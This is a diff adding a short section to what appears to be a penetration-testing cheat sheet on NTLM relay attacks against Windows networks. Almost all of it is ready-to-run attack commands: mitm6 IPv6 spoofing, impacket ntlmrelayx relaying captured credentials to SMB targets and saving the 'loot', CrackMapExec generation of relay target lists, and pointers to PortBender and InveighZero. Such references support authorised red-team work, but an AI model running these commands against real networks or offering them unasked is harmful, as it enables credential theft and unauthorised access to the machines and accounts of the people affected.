@@ -1,0 +1,16 @@
+- Through Cobalt Strike:
+	- https://github.com/praetorian-inc/PortBender
+- Through .NET
+	- https://github.com/Kevin-Robertson/InveighZero
+- MITM6 - Spoof IPv6 and relay requests to targets
+	- `mitm6 -d <domain.local>`
+	- `ntlmrelayx.py -6 -wh 192.168.1.1 -t smb://192.168.1.2 -l ~/tmp/`
+		- `-6` specifies ipv6, `-wh` specifies where the WPAD file is hosted at (your IP usually). `-t` specifies the target, or destination where the credentials will be relayed. `-l` is to where to store the loot.
+- Generate list of relay targets (SMB signing disabled)
+	- `cme smb scope.txt --gen-relay-list relay.txt`
+- Basic NTLM Relay
+	- `impacket-ntlmrelayx -t <target> -smb2support`
+	- With targets file
+		- `impacket-ntlmrelayx -tf relay.txt -smb2support`
+
+- NTLM Relay to AD CS HTTP Endpoints - see ADCS section
